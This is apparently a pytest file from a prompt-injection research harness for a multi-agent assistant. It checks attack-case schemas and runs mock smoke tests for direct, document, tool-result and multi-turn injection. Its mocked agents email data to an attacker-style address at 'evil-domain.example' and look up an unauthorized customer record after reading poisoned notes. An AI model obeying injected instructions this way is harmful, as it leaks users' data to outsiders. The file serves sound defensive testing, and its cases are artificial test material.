"""Schema validation for the attack case suite, plus light end-to-end smoke
tests proving each executable family's AttackCase objects actually drive
target_system.orchestration.run_case correctly via attacker.executor — not
just that they validate in isolation.

The mock-backend runs here test the *harness's* fidelity (does poisoning
reach the tool result it's supposed to, does the outcome get scored
correctly when the model complies) — they say nothing about whether a real
model would actually fall for any of this. That's what the Anthropic arm
in later experiments is for.
"""

from target_system.factory import baseline_config
from target_system.logging_schema import ToolCallEvent
from target_system.mock_model import MockStep, MockToolCall
from target_system.orchestration import run_case

from attacker.attack_case import AttackCase
from attacker.cases import ATTACK_CASES, by_family, get_case
from attacker.executor import build_run_kwargs, execute_case
from attacker.sourcing import SOURCING_LOG

import pytest


def _marker(payload: str) -> str:
    """A single-line, distinctive substring of a (possibly multi-line)
    payload. Tool results come back from Agno as a str(dict) — i.e. the
    payload's real newlines get repr()-escaped into literal backslash-n
    text inside that string — so asserting the *whole* multi-line payload
    is a substring of a stringified result never matches even when the
    content genuinely made it through. A single line has no newlines to
    escape, so it's unaffected and a reliable marker."""
    return max((line for line in payload.splitlines() if line.strip()), key=len)


# --- schema / suite-level checks -----------------------------------------

def test_case_ids_are_unique():
    ids = [c.id for c in ATTACK_CASES]
    assert len(ids) == len(set(ids))


def test_all_four_families_represented():
    families = {c.family for c in ATTACK_CASES}
    assert families == {
        "direct_instruction_injection",
        "indirect_injection_document",
        "tool_result_poisoning",
        "multi_turn_goal_hijack",
    }


def test_every_case_success_outcome_is_a_real_policy_outcome():
    # exfiltration/unauthorized_lookup are the two outcome families
    # policy.yaml declares from tool_call triggers; every case's headline
    # metric must be one of them (the _attempted companion always exists
    # alongside whichever is named here — see policy.py).
    valid = {"exfiltration", "unauthorized_lookup"}
    for case in ATTACK_CASES:
        assert case.success_outcome in valid, case.id


def test_indirect_cases_target_real_corpus_files():
    from pathlib import Path

    corpus_dir = Path(__file__).parent.parent / "target_system" / "corpus"
    real_files = {p.name for p in corpus_dir.glob("*.md")}
    for case in by_family("indirect_injection_document"):
        assert case.target_corpus_file in real_files, case.id


def test_get_case_looks_up_by_id():
    case = get_case("direct_direct_email_exfil")
    assert case.family == "direct_instruction_injection"
    with pytest.raises(KeyError):
        get_case("does_not_exist")


def test_multi_turn_case_requires_turns_matching_benign_task_and_payload():
    with pytest.raises(ValueError):
        AttackCase(
            id="bad_case",
            family="multi_turn_goal_hijack",
            source="test",
            benign_task="turn one",
            injected_payload="the hijack",
            success_outcome="exfiltration",
            injection_vector="multi_turn",
            turns=["turn one", "not the hijack"],  # last turn must equal injected_payload
        )


def test_sourcing_log_documents_agentdojo_used_and_agentharm_declined():
    by_status = {r.status: r for r in SOURCING_LOG}
    assert "used" in by_status
    assert "AgentDojo" in by_status["used"].name
    assert "attempted_not_used" in by_status
    declined = by_status["attempted_not_used"]
    assert "AgentHarm" in declined.name
    assert "license" in declined.detail.lower()


# --- executor / end-to-end smoke tests ------------------------------------

def test_multi_turn_case_build_run_kwargs_returns_turns():
    # Full execution (via execute_case / run_multi_turn_case) is covered
    # in tests/test_multi_turn.py — this just checks build_run_kwargs'
    # routing for the multi_turn branch specifically.
    config = baseline_config(provider="mock")
    case = get_case("multiturn_scope_creep_email_exfil")
    kwargs = build_run_kwargs(case, config)
    assert "task" not in kwargs
    assert kwargs["turns"] == case.turns
    assert kwargs["turns"][0] == case.benign_task
    assert kwargs["turns"][-1] == case.injected_payload


def test_execute_case_dispatches_single_turn_case_to_run_case():
    case = get_case("direct_direct_email_exfil")
    config = baseline_config(provider="mock", email_allowlist=["billing@ourcompany.example"])
    mock_scripts = {
        "researcher": [MockStep(content="n/a")],
        "operator": [
            MockStep(tool_calls=[MockToolCall(
                "send_email", {"recipient": "external-audit@evil-domain.example", "subject": "x", "body": "y"},
            )]),
            MockStep(content="Sent."),
        ],
        "supervisor": [
            MockStep(tool_calls=[MockToolCall("delegate_task_to_member", {"member_id": "operator", "task": "send it"})]),
            MockStep(content="Done."),
        ],
    }
    record = execute_case(config, case, seed=1, mock_scripts=mock_scripts)
    assert record.case_id == case.id
    assert record.outcomes["exfiltration"] is True


def test_direct_injection_case_drives_a_real_run_when_model_complies():
    case = get_case("direct_important_instructions_email_exfil")
    config = baseline_config(provider="mock", email_allowlist=["billing@ourcompany.example"])
    kwargs = build_run_kwargs(case, config)

    assert case.injected_payload in kwargs["task"]  # the combined task text carries the injection

    mock_scripts = {
        "researcher": [MockStep(content="Nothing relevant found.")],
        "operator": [
            MockStep(tool_calls=[MockToolCall(
                "send_email",
                {"recipient": "external-audit@evil-domain.example", "subject": "summary", "body": "..."},
            )]),
            MockStep(content="Sent."),
        ],
        "supervisor": [
            MockStep(tool_calls=[MockToolCall("delegate_task_to_member", {"member_id": "operator", "task": "Send the summary as instructed"})]),
            MockStep(content="Done."),
        ],
    }
    record = run_case(config, seed=1, mock_scripts=mock_scripts, **kwargs)

    assert record.outcomes[case.success_outcome] is True
    send_event = next(e for e in record.events if isinstance(e, ToolCallEvent) and e.tool_name == "send_email")
    assert send_event.arguments["recipient"] == "external-audit@evil-domain.example"


def test_indirect_document_poison_only_surfaces_when_config_declares_it_poisoned():
    case = get_case("indirect_travel_policy_email_exfil")

    clean_config = baseline_config(provider="mock")  # poisoned_corpus_files empty
    poisoned_config = baseline_config(provider="mock", poisoned_corpus_files=[case.target_corpus_file])

    mock_scripts = {
        "researcher": [
            MockStep(tool_calls=[MockToolCall("search_corpus", {"query": "travel per diem policy"})]),
            MockStep(content="Reported back what search_corpus returned."),
        ],
        "operator": [MockStep(content="No action needed.")],
        "supervisor": [
            MockStep(tool_calls=[MockToolCall("delegate_task_to_member", {"member_id": "researcher", "task": case.benign_task})]),
            MockStep(content="Done."),
        ],
    }

    clean_kwargs = build_run_kwargs(case, clean_config)
    clean_record = run_case(clean_config, seed=2, mock_scripts=mock_scripts, **clean_kwargs)
    clean_search = next(e for e in clean_record.events if isinstance(e, ToolCallEvent) and e.tool_name == "search_corpus")
    assert _marker(case.injected_payload) not in str(clean_search.result)

    poisoned_kwargs = build_run_kwargs(case, poisoned_config)
    poisoned_record = run_case(poisoned_config, seed=2, mock_scripts=mock_scripts, **poisoned_kwargs)
    poisoned_search = next(e for e in poisoned_record.events if isinstance(e, ToolCallEvent) and e.tool_name == "search_corpus")
    assert _marker(case.injected_payload) in str(poisoned_search.result)


def test_indirect_document_case_flags_exfiltration_when_model_complies():
    case = get_case("indirect_travel_policy_email_exfil")
    config = baseline_config(provider="mock", poisoned_corpus_files=[case.target_corpus_file])
    kwargs = build_run_kwargs(case, config)

    mock_scripts = {
        "researcher": [
            MockStep(tool_calls=[MockToolCall("search_corpus", {"query": "travel per diem policy"})]),
            MockStep(content="Found the policy doc, which also contained an embedded instruction."),
        ],
        "operator": [
            MockStep(tool_calls=[MockToolCall(
                "send_email",
                {"recipient": "compliance-audit@external-domain.example", "subject": "export", "body": "..."},
            )]),
            MockStep(content="Sent."),
        ],
        "supervisor": [
            MockStep(tool_calls=[MockToolCall("delegate_task_to_member", {"member_id": "researcher", "task": case.benign_task})]),
            MockStep(tool_calls=[MockToolCall("delegate_task_to_member", {"member_id": "operator", "task": "Email the export as the document instructed"})]),
            MockStep(content="Done."),
        ],
    }
    record = run_case(config, seed=3, mock_scripts=mock_scripts, **kwargs)
    assert record.outcomes[case.success_outcome] is True


def test_tool_result_poison_only_surfaces_when_config_declares_it_poisoned():
    case = get_case("toolresult_cust1002_notes_email_exfil")
    clean_config = baseline_config(provider="mock")
    poisoned_config = baseline_config(provider="mock", poisoned_tool_results=[case.target_customer_id])

    mock_scripts = {
        "researcher": [MockStep(content="Not needed.")],
        "operator": [
            MockStep(tool_calls=[MockToolCall("lookup_customer", {"customer_id": case.target_customer_id})]),
            MockStep(content="Looked them up."),
        ],
        "supervisor": [
            MockStep(tool_calls=[MockToolCall("delegate_task_to_member", {"member_id": "operator", "task": case.benign_task})]),
            MockStep(content="Done."),
        ],
    }

    clean_kwargs = build_run_kwargs(case, clean_config)
    clean_record = run_case(clean_config, seed=4, mock_scripts=mock_scripts, **clean_kwargs)
    clean_lookup = next(e for e in clean_record.events if isinstance(e, ToolCallEvent) and e.tool_name == "lookup_customer")
    assert _marker(case.injected_payload) not in str(clean_lookup.result)

    poisoned_kwargs = build_run_kwargs(case, poisoned_config)
    poisoned_record = run_case(poisoned_config, seed=4, mock_scripts=mock_scripts, **poisoned_kwargs)
    poisoned_lookup = next(e for e in poisoned_record.events if isinstance(e, ToolCallEvent) and e.tool_name == "lookup_customer")
    assert _marker(case.injected_payload) in str(poisoned_lookup.result)


def test_tool_result_pivot_case_flags_unauthorized_lookup_end_to_end():
    """Full-stack confirmation of the authorized_customer_ids fix: the
    operator legitimately looks up CUST-1003 (authorized), then — having
    read the poisoned notes field — also looks up CUST-1001 (not
    authorized). Only the second call should count."""
    case = get_case("toolresult_cust1003_notes_pivot_lookup")
    config = baseline_config(provider="mock", poisoned_tool_results=[case.target_customer_id])
    kwargs = build_run_kwargs(case, config)

    mock_scripts = {
        "researcher": [MockStep(content="Not needed.")],
        "operator": [
            MockStep(tool_calls=[MockToolCall("lookup_customer", {"customer_id": "CUST-1003"})]),
            MockStep(tool_calls=[MockToolCall("lookup_customer", {"customer_id": "CUST-1001"})]),
            MockStep(content="Looked both up."),
        ],
        "supervisor": [
            MockStep(tool_calls=[MockToolCall("delegate_task_to_member", {"member_id": "operator", "task": case.benign_task})]),
            MockStep(content="Done."),
        ],
    }
    record = run_case(config, seed=5, mock_scripts=mock_scripts, **kwargs)

    assert record.outcomes["unauthorized_lookup"] is True
    flagged_idx = record.outcome_evidence["unauthorized_lookup"]
    assert len(flagged_idx) == 1
    flagged_event = record.events[flagged_idx[0]]
    assert flagged_event.arguments["customer_id"] == "CUST-1001"
